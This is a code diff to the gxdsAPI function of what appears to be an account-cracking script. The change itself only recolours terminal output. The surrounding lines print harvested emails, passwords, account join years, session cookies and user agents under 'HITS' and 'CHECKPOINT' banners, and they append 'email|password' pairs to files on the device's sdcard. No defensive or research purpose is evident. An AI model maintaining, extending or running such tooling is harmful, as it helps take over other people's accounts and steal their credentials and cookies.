@@ -594,11 +594,11 @@ def gxdsAPI(uid, pxss, tl):
                 )
                 print(
                     f"""{lgr}  [GXDS HITS]
- EMAIL  :\033[0;33m {uid} 
- PASS   :\033[0;33m {ps} 
- JOINED :\033[0;33m {yrs}
- COOKIE :\033[0;33m {coki}
- AGENT  :\033[0;33m {ugen}
+\033[1;36m  EMAIL  :\033[0;33m {uid} 
+\033[1;36m  PASS   :\033[0;33m {ps} 
+\033[1;36m  JOINED :\033[0;33m {yrs}
+\033[1;36m  COOKIE :\033[0;33m {coki}
+\033[1;36m  AGENT  :\033[0;33m {ugen}
 """
                 )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
@@ -614,11 +614,11 @@ def gxdsAPI(uid, pxss, tl):
                 )
                 print(
                     f"""{lr}  [GXDS CHECKPOINT]
- EMAIL  :\033[0;33m {uid} 
- PASS   :\033[0;33m {ps} 
- JOINED :\033[0;33m {yrs}
- COOKIE :\033[0;33m {coki}
- AGENT  :\033[0;33m {ugen}
+\033[1;36m  EMAIL  :\033[0;33m {uid} 
+\033[1;36m  PASS   :\033[0;33m {ps} 
+\033[1;36m  JOINED :\033[0;33m {yrs}
+\033[1;36m  COOKIE :\033[0;33m {coki}
+\033[1;36m  AGENT  :\033[0;33m {ugen}
 """
                 )
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
